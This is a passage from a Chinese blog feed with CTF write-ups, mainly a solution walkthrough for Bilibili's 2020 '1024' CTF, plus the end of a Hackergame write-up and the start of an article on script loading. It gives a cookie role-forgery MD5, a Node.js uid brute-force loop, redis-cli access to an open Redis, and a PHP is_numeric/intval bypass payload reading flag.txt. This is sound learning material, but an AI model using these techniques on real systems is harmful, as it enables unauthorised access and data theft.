src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\"> <div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-06</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\"> <div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-25</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 